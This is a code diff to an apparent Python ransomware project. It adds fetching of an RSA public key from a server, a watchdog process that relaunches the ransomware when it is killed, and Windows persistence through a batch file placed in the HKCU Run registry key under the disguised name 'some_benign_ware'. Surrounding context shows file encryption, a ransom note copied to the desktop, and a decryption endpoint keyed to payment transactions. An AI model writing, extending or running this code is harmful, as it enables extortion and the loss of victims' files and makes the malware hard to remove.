@@ -1,21 +1,30 @@
 import os
 import http_requests
-
+import ctypes
 import aes_cipher
 import rsa_cipher
 import shutil
-
+import psutil
 from fastapi import FastAPI
 import uvicorn
+import multiprocessing
+import winreg as reg   
+import sys
+
 
 EXPLANATION_FILENAME = 'YOUR_FILES_ENCRYPTED.txt'
 ENCRYPTED_FILE_TAG = 'ransom_encrypted'
 DIRECTORY_TO_ENCRYPT = 'RANSOM'
 
+
+
+
+
 app = FastAPI()
 
 @app.on_event('startup')
 async def startup():
+    
     await main()
 
 @app.get("/attempt_decrypt/{transaction_id}")
@@ -122,7 +131,71 @@ async def decrypt_files(transaction_id):
 
     return 'Successfully decrypted files. If you want to use service again please run the ransomware again :)'
 
+
+
+async def get_server_public_key(file_name):
+    try:
+        if(os.stat(file_name).st_size != 0):
+            return 1;
+
+    except:
+        pass
+
+    #a file with that name doesnot exist on this library or there is no data.
+    #we will request from the server the public key
+    try:
+        data = await http_requests.request_server_public_key()
+        print(type(data))
+        if type(data) == dict and 'failed' in data:
+            print('the server cant generate a public key for usage')
+            return
+        
+        
+        with open(file_name,"w") as f:
+            f.write(data)
+    except Exception as e:
+        print(e)
+   
+    return 0
+    
+
+    
+
+def watchdog(selected_pid):
+    import time
+    
+
+    #ctypes.windll.user32.MessageBoxW(0, str(os.getpid()), "ransomware_watchdog_pid", 1)
+    print(f'ransomware watchdog pid: {str(os.getpid())}')
+    while True:
+        time.sleep(5)
+        #print(selected_pid)
+        if not psutil.pid_exists(selected_pid):
+            p = multiprocessing.Process(target=main_helper, args=())
+            p.start()
+            selected_pid = p.pid
+            print(f'ransomware main pid: {str(selected_pid)}')
+    
+def set_watchdog():
+    pid_main = os.getpid()
+    p = multiprocessing.Process(target=watchdog, args=(pid_main,))
+    p.start()
+
+def create_dir(path):
+    isExists = os.path.exists(path)
+    isDir = os.path.isdir(path)
+    
+    if(isExists and not isDir):
+        return "wrong path"
+
+    if(not isExists):
+        os.makedirs(path)
+
+
 async def main():
+    #check_if_admin()
+    create_dir('./keys/')
+    await get_server_public_key("./keys/public.pem")
     rsa_cipher.setup()
 
     await encrypt_files()
@@ -132,7 +205,36 @@ async def main():
     shutil.copy(EXPLANATION_FILENAME, desktop_path)
 
     print('Successully encrypted files')
+ 
+      
+def persistence():
+    try:
+        with open('start.bat','w') as f:
+            f.write('timeout /t 15\n')
+            f.write(f'chdir /d \"{str(os.getcwd())}\"\n')
+            f.write(f'python \"{str(os.getcwd())}\main.py\"\nexit')
+    except Exception as e:
+        print(e)
 
+
+
+    current_path = str(os.getcwd()) + '\\start.bat'       
+    key = reg.HKEY_CURRENT_USER
+    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
+    with reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS) as open_:
+        reg.SetValueEx(open_,"some_benign_ware",0,reg.REG_SZ,current_path)
+        reg.CloseKey(open_)
+
+def main_helper():
+    #ctypes.windll.user32.MessageBoxW(0, str(os.getpid()), "ransomware_pid", 1)
+    persistence()
+    print(f'ransomware main pid: {str(os.getpid())}')
+    uvicorn.run("main:app", port=8074, host='127.0.0.1')
 
 if __name__ == "__main__":
-    uvicorn.run(app, host="127.0.0.1", port=8074)
+    
+    #ctypes.windll.user32.MessageBoxW(0, str(os.getpid()), "ransomware", 1)
+    #uvicorn.run(app, host="127.0.0.1", port=)
+    set_watchdog()
+    main_helper()
+    uvicorn.run("main:app", port=8074, host='127.0.0.1')
